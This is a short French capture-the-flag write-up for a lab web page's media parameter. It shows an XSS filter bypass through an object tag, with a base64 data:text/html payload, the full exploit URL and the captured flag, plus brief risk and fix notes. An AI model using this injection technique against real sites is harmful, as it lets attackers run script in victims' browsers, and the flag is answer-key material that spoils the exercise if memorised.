# MEDIA PAGE

## CIBLE: http://10.12.1.150/?page=media&src=nsa

## FAILLE: XSS / object balise

### PRÉ REQUIS

Aucun.

### RECHERCHE

On peut voir que l'image est affichée avec la balise object.
Après quelques recherche on peut voir qu'on peut mettre du data/text en base64.
`https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris`

### EXPLOITATION

Il suffit de convertir en base64 "\<script>alert" avec la commande `echo "<script>alert" | base64`<br>
et de le mettre le résultat (`PHNjcmlwdD5hbGVydAo=`) dans l'url après `data:text/html;base64,`.<br>
Ce qui donne `http://10.12.1.129/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydAo=`.<br>
On obtient le flag `928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D`.<br>

## RISQUE

Avec ce genre d'inclusion d'image on peut injecter du code en le convertissant le code en base64.

## PROTECTION

Il suffit d'inclure les images via le CSS ou directement avec la balise `<img>`.
